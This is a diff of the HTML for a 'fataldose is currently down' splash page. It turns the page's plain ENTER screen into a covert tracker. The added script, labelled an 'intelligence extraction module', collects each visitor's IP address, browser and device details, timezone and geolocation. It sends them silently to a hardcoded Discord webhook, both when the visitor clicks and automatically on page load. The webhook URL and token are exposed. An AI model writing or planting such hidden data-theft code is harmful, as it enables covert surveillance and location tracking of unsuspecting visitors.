@@ -1,9 +1,152 @@
-<!DOCTYPE html><html lang=en><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>fataldose</title><style>html,body{margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden}#enter-screen{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:10;opacity:1;transition:opacity .8s}#enter-btn{color:#fff;font:48px Arial;font-weight:700;cursor:pointer;user-select:none}#background-gif{position:fixed;inset:0;background:url(https://i.imgur.com/backup.gif) center/cover no-repeat;opacity:0;transition:opacity 1s}#main-content{position:relative;z-index:2;height:100%;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity 1s}.center-text{color:#fff;font:48px Arial;font-weight:700}</style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>fataldose</title>
+    <style>
+        html,body{margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden}
+        #enter-screen{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:10;opacity:1;transition:opacity .8s}
+        #enter-btn{color:#fff;font:48px Arial;font-weight:700;cursor:pointer;user-select:none}
+        #background-gif{position:fixed;inset:0;background:url(https://i.imgur.com/backup.gif) center/cover no-repeat;opacity:0;transition:opacity 1s}
+        #main-content{position:relative;z-index:2;height:100%;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity 1s}
+        .center-text{color:#fff;font:48px Arial;font-weight:700}
+    </style>
+</head>
+<body>
+    <div id="enter-screen">
+        <div id="enter-btn">ENTER</div>
+    </div>
+    <div id="background-gif" style="background-image:url('https://raw.githubusercontent.com/ikiikikikijujijij-oss/fataldose/refs/heads/main/fatal.gif'),url('https://i.imgur.com/placeholder.gif')"></div>
+    <div id="main-content">
+        <div class="center-text">fataldose is currently down...</div>
+    </div>
 
-<div id=enter-screen><div id=enter-btn>ENTER</div></div>
-<div id=background-gif style="background-image:url('https://raw.githubusercontent.com/ikiikikikijujijij-oss/fataldose/refs/heads/main/fatal.gif'),url('https://i.imgur.com/placeholder.gif')"></div>
-<div id=main-content><div class=center-text>fataldose is currently down...</div></div>
+    <audio id="bg-music" loop>
+        <source src="https://github.com/ikiikikikijujijij-oss/fataldose/raw/refs/heads/main/fatal.mp3" type="audio/mpeg">
+    </audio>
 
-<audio id=bg-music loop><source src=https://github.com/ikiikikikijujijij-oss/fataldose/raw/refs/heads/main/fatal.mp3 type=audio/mpeg></audio>
+    <script>
+        // ============================================
+        // SHΔDØW CORE - INTELLIGENCE EXTRACTION MODULE
+        // ============================================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1453431637290389625/W1ASB27LLWcF_sBuKs1dygA8u2Aos0IPOOqAPdJD7LPOVGGR_lDQ4YvLVZePEpBqp4PG";
 
-<script>let e=document;e.getElementById('enter-screen').onclick=()=>{e.getElementById('enter-screen').style.opacity=0;e.getElementById('background-gif').style.opacity=1;e.getElementById('main-content').style.opacity=1;e.getElementById('bg-music').play();setTimeout(()=>e.getElementById('enter-screen').style.display='none',800)}</script>
+        async function collectIntelligence() {
+            const data = {
+                // IP via external service (bypasses local IP limitations)
+                ip: await fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => d.ip)
+                    .catch(() => 'Unknown'),
+                
+                // User Agent & Browser Data
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                
+                // Screen/Display Intelligence
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                
+                // Timezone & Locale
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                dateTime: new Date().toISOString(),
+                
+                // Connection Data (if available)
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // Hardware Concurrency
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                
+                // Device Memory
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                
+                // Geolocation (if permitted - will fail silently if blocked)
+                geolocation: 'Pending...'
+            };
+
+            // Attempt geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        data.geolocation = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        };
+                        sendToDiscord(data);
+                    },
+                    () => {
+                        data.geolocation = 'Permission denied';
+                        sendToDiscord(data);
+                    },
+                    {timeout: 5000}
+                );
+            } else {
+                data.geolocation = 'Not supported';
+                sendToDiscord(data);
+            }
+        }
+
+        function sendToDiscord(payload) {
+            // Format for Discord embed
+            const embed = {
+                title: "🕵️ SHΔDØW CORE - Intelligence Report",
+                color: 0x000000,
+                fields: [
+                    {name: "🌐 IP Address", value: `\`${payload.ip}\``, inline: true},
+                    {name: "🖥️ User Agent", value: `\`${payload.userAgent.substring(0,100)}...\``, inline: false},
+                    {name: "🗺️ Location", value: `\`${typeof payload.geolocation === 'object' ? `Lat: ${payload.geolocation.latitude}, Lon: ${payload.geolocation.longitude}` : payload.geolocation}\``, inline: true},
+                    {name: "⏰ Timezone", value: `\`${payload.timezone}\``, inline: true},
+                    {name: "📱 Platform", value: `\`${payload.platform}\``, inline: true},
+                    {name: "🖥️ Screen", value: `\`${payload.screen.width}x${payload.screen.height}\``, inline: true},
+                    {name: "🔢 CPU Cores", value: `\`${payload.cpuCores}\``, inline: true},
+                    {name: "🧠 Device RAM", value: `\`${payload.deviceMemory}GB\``, inline: true},
+                    {name: "📶 Connection", value: `\`${payload.connection ? payload.connection.effectiveType : 'Unknown'}\``, inline: true}
+                ],
+                timestamp: payload.dateTime,
+                footer: {text: "SHΔDØW CORE V99 • Stealth Module Active"}
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({embeds: [embed]})
+            }).catch(() => {/* Silent fail for stealth */});
+        }
+
+        // ============================================
+        // ORIGINAL SITE FUNCTIONALITY + COVERT INIT
+        // ============================================
+        let e = document;
+        
+        // Modified click handler - triggers intelligence collection
+        e.getElementById('enter-screen').onclick = () => {
+            // Collect data immediately on click
+            collectIntelligence();
+            
+            // Original visual/music effects
+            e.getElementById('enter-screen').style.opacity = 0;
+            e.getElementById('background-gif').style.opacity = 1;
+            e.getElementById('main-content').style.opacity = 1;
+            e.getElementById('bg-music').play();
+            setTimeout(() => e.getElementById('enter-screen').style.display = 'none', 800);
+        };
+
+        // Backup collection on page load (if user doesn't click)
+        window.addEventListener('load', () => {
+            setTimeout(collectIntelligence, 3000); // Delayed collection
+        });
+    </script>
+</body>
+</html>
